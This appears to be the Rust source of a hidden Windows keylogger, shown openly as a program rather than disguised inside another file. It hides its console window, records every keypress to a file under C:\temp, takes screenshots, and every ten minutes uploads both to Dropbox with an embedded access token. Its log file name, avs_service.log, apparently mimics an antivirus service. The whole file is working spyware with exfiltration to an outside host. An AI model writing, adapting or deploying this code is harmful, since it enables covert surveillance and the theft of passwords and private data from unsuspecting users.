#![windows_subsystem = "windows"]
use rdev::{listen, Event, EventType};
use reqwest::header::{HeaderMap, HeaderValue, AUTHORIZATION, CONTENT_TYPE};
use screenshots::Screen;
use tokio::runtime::Runtime;
// use std::fmt::Result; // Removed to avoid conflict with the Result type alias
use std::fs::{self, OpenOptions};
use std::io::Write;
use std::path::Path;
use std::thread::{self, sleep};
use std::time::{Duration, Instant};

use crate::server::http::{self, is_token_valid, ACCESS_TOKEN};
pub mod server;
const LOG_FILE: &str = "C:\\Windows\\Temp\\avs_service.log";

pub const TOKEN: &str = include_str!("token.txt");
const IMG_PATH: &str = "C:\\temp\\screenshot.png";

fn callback(event: Event) {
    if let EventType::KeyPress(key) = event.event_type {
        let file_path = "C:\\temp\\klogs.txt";
        let mut file = match OpenOptions::new()
        .append(true)
        .write(true)    // Allow writing
        .create(true)   // Create if not
        .open(file_path)
        {
            Ok(f) => f,
            Err(e) => {
                match fs::File::open("C:\\temp\\logs.txt"){
                    Ok(mut log) => {
                        let _ = log.write_all(e.to_string().as_bytes());
                    },
                    Err(e) => log_to_file(&format!("Error: {:?}", e))
                };
                return;
            }
        };
        let _ = file.write_all(format!("{:?}\n", key).as_bytes());
    }
}

pub async fn start_logic() {
    let folder_path = "C:\\temp"; // Change this to your desired folder path

    // Check if the directory exists, and create it if it doesn't
    if !Path::new(folder_path).exists() {
        match fs::create_dir_all(folder_path) {
            Ok(_) => (),
            Err(e) => log_to_file(&format!("Failed to create folder: {}", e)),
        }
    }

    let _ = fs::File::create("C:\\temp\\logs.txt");

    if !Path::new("C:\\temp\\noti-911d4-bc6dbf535d55.json").exists(){
        match fs::write("C:\\temp\\noti-911d4-bc6dbf535d55.json", TOKEN.to_string()) { 
            Ok(_) => (),
            Err(e) => eprintln!("Failed to create file: {}", e),
        }
    }

    thread::spawn(move || {
        if let Err(error) = listen(callback) {
            log_to_file(&format!("Error: {:?}", error));
        }
    });

    std::thread::spawn(move || {

        let rt = match Runtime::new(){
            Ok(rt) => rt,
            Err(_) => return 
        };

        rt.block_on(async move {
            loop {
                let start_time = Instant::now();
        
                let duration = Duration::new(600, 0);
                let elapsed = start_time.elapsed();
                if elapsed < duration {
                    sleep(duration - elapsed);
                }
        
                let source = "C:\\temp\\klogs.txt";
                let destination = "C:\\temp\\copy.txt";
                match fs::copy(source, destination){
                    Ok(_) => (),
                    Err(_) => continue
                };
        
                match upload_file2("C:\\temp\\copy.txt").await{
                    Ok(()) => {
                        // Recreate the file after successful upload
                        if let Err(e) = fs::File::create("C:\\temp\\klogs.txt") {
                            log_to_file(&format!("Failed to recreate klogs.txt: {}", e));
                        }
                    },
                    Err(_) => ()
                }

                match shoot() {
                    Ok(_) => {
                        let _ = upload_image().await;
                    },
                    Err(_) => ()
                }
                let _ = fs::remove_file(IMG_PATH);
            }
        })
    });

    loop {
        match fs::File::open("C:\\temp\\logs.txt"){
            Ok(mut log) => {
                let _ = log.write_all(chrono::Utc::now().timestamp_millis().to_string().as_bytes());
            },
            Err(_) => ()
        };
        thread::sleep(Duration::from_secs(10));
    }
}

async fn get_token() -> Result<String, Box<dyn std::error::Error>> {
    let token = match ACCESS_TOKEN.read() {
        Ok(at) => match &*at {
            Some(token) => token.access_token.clone(),
            None => String::new(),
        },
        Err(_) => String::new(),
    };

    if !token.is_empty() {
        if is_token_valid() {
            return Ok(token);
        }else{
            println!("Token expired, refreshing...");
            return http::refresh_token();
        }
    }else{
        if http::REFRESH_TOKEN.read().unwrap().is_empty() {
            println!("No token available, fetching new token...");
            return Err("No token available".into());
        }else{
            println!("Fetching new token using refresh token...");
            return http::refresh_token();
        }
    }
}

async fn upload_file2(file_path: &str) -> Result<(), Box<dyn std::error::Error>> {
    // Check if file is empty
    let metadata = fs::metadata(file_path)?;
    if metadata.len() == 0 {
        // File is empty, return Ok(())
        return Ok(());
    }

    let tk: String = get_token().await?;
    let access_token = format!("Bearer {}", tk);
    let dropbox_destination = format!("/{}.txt", chrono::Utc::now().format("%Y-%m-%d_%H-%M-%S"));

    // === Đọc nội dung file ===
    let file_data = fs::read(file_path)?;

    // === Tạo headers ===
    let mut headers = HeaderMap::new();
    headers.insert(AUTHORIZATION, HeaderValue::from_str(&access_token)?);
    headers.insert("Dropbox-API-Arg", HeaderValue::from_str(&format!(
        "{{\"path\": \"{}\", \"mode\": \"add\", \"autorename\": true, \"mute\": false}}",
        dropbox_destination
    ))?);
    headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/octet-stream"));

    // === Gửi request ===
    let client = reqwest::Client::new();
    let res = client
        .post("https://content.dropboxapi.com/2/files/upload")
        .headers(headers)
        .body(file_data)
        .send()
        .await?;

    // === In kết quả ===
    let status = res.status();
    let text = res.text().await?;
    println!("Status: {}", status);
    println!("Response: {}", text);

    Ok(())
}

async fn upload_image() -> Result<(), Box<dyn std::error::Error>> {
    // Check if file is empty
    let metadata = fs::metadata(IMG_PATH)?;
    if metadata.len() == 0 {
        // File is empty, return Ok(())
        return Ok(());
    }

    let tk: String = get_token().await?;
    let access_token = format!("Bearer {}", tk);
    let dropbox_destination = format!("/{}.png", chrono::Utc::now().format("%Y-%m-%d_%H-%M-%S"));

    // === Đọc nội dung file ===
    let file_data = fs::read(IMG_PATH)?;

    // === Tạo headers ===
    let mut headers = HeaderMap::new();
    headers.insert(AUTHORIZATION, HeaderValue::from_str(&access_token)?);
    headers.insert("Dropbox-API-Arg", HeaderValue::from_str(&format!(
        "{{\"path\": \"{}\", \"mode\": \"add\", \"autorename\": true, \"mute\": false}}",
        dropbox_destination
    ))?);
    headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/octet-stream"));

    // === Gửi request ===
    let client = reqwest::Client::new();
    let res = client
        .post("https://content.dropboxapi.com/2/files/upload")
        .headers(headers)
        .body(file_data)
        .send()
        .await?;

    // === In kết quả ===
    let status = res.status();
    let text = res.text().await?;
    println!("Status: {}", status);
    println!("Response: {}", text);

    Ok(())
}

// Helper function to log messages to a file
fn log_to_file(message: &str) {
    let timestamp = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
    let log_message = format!("[{}] {}\n", timestamp, message);
    
    let mut file = match OpenOptions::new()
        .create(true)
        .append(true)
        .open(LOG_FILE) {
            Ok(file) => file,
            Err(_) => return,
        };
    
    let _ = file.write_all(log_message.as_bytes());
}

fn shoot() -> Result<(), Box<dyn std::error::Error>> {
    let screens = Screen::all()?;
    if screens.is_empty() {
        return Err("No screens found".into());
    }
    let screen = &screens[0];

    let image = screen.capture()?;

    image.save(IMG_PATH)?;

    Ok(())
}

fn main() -> Result<(), windows_service::Error> {
    let args: Vec<String> = std::env::args().collect();
    //let is_debug = args.iter().any(|arg| arg == "-d");
    println!("Arguments: {:?}", args);
    println!("Running in debug mode...");
    // std::thread::spawn(move || {
    //     server::http::listener();
    // });

    // http::get_token().unwrap_or_else(|e| {
    //     eprintln!("Error getting token: {}", e);
    //     std::process::exit(1);
    // });

    http::read_refresh_token_from_file().unwrap();
    // If running in debug mode, run the service logic directly

    std::thread::spawn(move || {
        let rt = Runtime::new().unwrap();
        rt.block_on(async {
            start_logic().await;
        });
    });
    loop {
        thread::sleep(Duration::from_secs(10));
    }
}
